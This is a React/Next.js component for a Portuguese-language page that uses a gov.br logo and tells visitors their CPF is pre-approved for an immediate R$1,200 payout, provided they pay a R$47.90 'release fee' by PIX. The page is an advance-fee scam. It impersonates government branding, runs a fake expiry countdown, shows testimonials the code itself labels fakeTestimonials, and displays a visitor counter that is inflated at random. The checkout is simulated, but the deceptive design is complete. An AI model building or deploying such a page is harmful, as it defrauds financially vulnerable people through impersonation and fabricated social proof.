
"use client";

import type React from 'react';
import { useState, useEffect } from 'react';
import Image from 'next/image';
import OfferTimer from '@/components/features/OfferTimer';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { CheckCircle, Users, Zap, AlertTriangle, ShieldCheck } from 'lucide-react';

interface OfferStepProps {
  cpf: string | null;
}

const fakeTestimonials = [
  {
    name: "Carlos A.",
    location: "São Paulo, SP",
    text: "Não acreditei quando vi, mas realmente funcionou! O dinheiro caiu rápido na conta.",
    stars: 5,
  },
  {
    name: "Fernanda L.",
    location: "Rio de Janeiro, RJ",
    text: "Estava precisando muito, e essa liberação veio na hora certa. Recomendo!",
    stars: 5,
  },
  {
    name: "José M.",
    location: "Belo Horizonte, MG",
    text: "Processo simples e o valor ajudou demais nas contas. A taxa é pequena perto do benefício.",
    stars: 4,
  },
];

const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
  const [peopleServed, setPeopleServed] = useState(1387); 

  useEffect(() => {
    const interval = setInterval(() => {
      setPeopleServed(prev => prev + Math.floor(Math.random() * 3) + 1);
    }, 3500); 
    return () => clearInterval(interval);
  }, []);

  const handleLiberarAcessoClick = () => {
    console.log("LIBERAR ACESSO IMEDIATO AGORA clicado! CPF:", cpf, "Redirect to R$47,90 checkout.");
    // window.location.href = 'YOUR_CHECKOUT_URL_HERE';
    alert("Redirecionando para pagamento da taxa de R$47,90 (simulado)");
  };

  return (
    <div className="w-full max-w-2xl mx-auto p-4 md:p-6 bg-background text-foreground">
      <div className="mb-4">
        <Image
          src="https://i.imgur.com/oP20qzf.png"
          alt="gov.br logo"
          width={60}
          height={60}
          data-ai-hint="government logo"
        />
      </div>
      
      <Card className="border-primary shadow-2xl">
        <CardHeader className="bg-primary text-primary-foreground text-center rounded-t-lg p-4 md:p-6">
          <CardTitle className="font-headline text-xl md:text-3xl font-bold">
            🎉 PARABÉNS! SEU ACESSO FOI APROVADO! 🎉
          </CardTitle>
          <CardDescription className="text-primary-foreground/80 text-sm md:text-base mt-1">
            Você está a um passo de liberar seus benefícios exclusivos.
          </CardDescription>
        </CardHeader>
        <CardContent className="p-4 md:p-6 space-y-6">
          <div className="text-center">
            <h2 className="font-headline text-lg md:text-xl font-semibold text-primary mb-3">Benefícios Pré-Aprovados para o CPF: {cpf ? `***.${cpf.substring(4, 7)}.${cpf.substring(8, 11)}-**` : '***.***.***-**'}</h2>
            <ul className="space-y-2 text-left text-sm md:text-base max-w-md mx-auto">
              {[
                "Liberação Imediata de R$ 1.200,00 em sua conta.",
                "Acesso à Plataforma VIP de Consultas Financeiras.",
                "Suporte Prioritário 24/7 via WhatsApp.",
                "Relatório de Crédito Detalhado (SPC/Serasa).",
              ].map((benefit, index) => (
                <li key={index} className="flex items-start">
                  <CheckCircle className="h-5 w-5 text-accent mr-2 mt-0.5 shrink-0" />
                  <span>{benefit}</span>
                </li>
              ))}
            </ul>
          </div>

          <div className="bg-destructive/10 p-3 sm:p-4 rounded-lg border border-destructive/30 text-center">
            <div className="flex flex-wrap items-center justify-center text-center text-destructive font-semibold text-xs sm:text-base md:text-lg mb-2">
              <AlertTriangle className="h-4 w-4 sm:h-5 sm:w-5 mr-1 sm:mr-2 animate-pulse" />
              OFERTA EXPIRA EM: <OfferTimer initialMinutes={5} initialSeconds={27} />
            </div>
            <p className="text-xs sm:text-sm text-destructive/80">Não perca esta oportunidade única!</p>
          </div>

          <div className="text-center p-4 md:p-6 bg-secondary rounded-lg shadow-md">
            <h3 className="font-headline text-base md:text-xl font-bold text-primary-foreground mb-2">TAXA ÚNICA DE LIBERAÇÃO DO SISTEMA</h3>
            <p className="text-3xl md:text-5xl font-bold text-accent mb-1">
              R$ 47<span className="text-2xl md:text-4xl">,90</span>
            </p>
            <p className="text-muted-foreground line-through text-base md:text-lg mb-2">DE R$ 97,90</p>
            <p className="text-xs md:text-sm text-primary-foreground/90 max-w-md mx-auto">
              Esta taxa administrativa é necessária para cobrir os custos de processamento da transação, manutenção da plataforma segura e consultas integradas aos bureaus de crédito. Pagamento 100% seguro.
            </p>
          </div>
          
          <Button
            className="w-full h-14 md:h-16 text-base md:text-xl font-bold bg-accent text-accent-foreground hover:bg-accent/90 shadow-lg animate-pulse"
            onClick={handleLiberarAcessoClick}
          >
            <Zap className="mr-2 h-6 md:h-7 w-6 md:w-7" />
            LIBERAR ACESSO IMEDIATO AGORA (PIX)
          </Button>
          <div className="text-center text-xs text-muted-foreground flex items-center justify-center">
            <ShieldCheck className="h-4 w-4 mr-1 text-accent" /> Ambiente 100% Seguro. Seus dados estão protegidos.
          </div>

          <div className="my-6 md:my-8">
            <h3 className="font-headline text-lg md:text-xl font-semibold text-primary text-center mb-4">O Que Nossos Usuários Dizem:</h3>
            <div className="space-y-4">
              {fakeTestimonials.map((testimonial, index) => (
                <Card key={index} className="bg-muted/50">
                  <CardContent className="p-3 md:p-4">
                    <div className="flex items-center mb-1">
                      {[...Array(testimonial.stars)].map((_, i) => (
                        <svg key={i} className="w-4 h-4 text-yellow-400 fill-current" viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg>
                      ))}
                    </div>
                    <p className="text-xs md:text-sm text-foreground italic">"{testimonial.text}"</p>
                    <p className="text-xs text-muted-foreground mt-2 font-semibold">- {testimonial.name}, {testimonial.location}</p>
                  </CardContent>
                </Card>
              ))}
            </div>
            <div className="mt-6 text-center p-3 bg-primary text-primary-foreground rounded-md shadow">
              <Users className="h-5 md:h-6 w-5 md:w-6 mx-auto mb-1" />
              <p className="text-lg md:text-xl font-bold">{peopleServed.toLocaleString('pt-BR')}</p>
              <p className="text-xs">PESSOAS ATENDIDAS HOJE</p>
            </div>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default OfferStep;
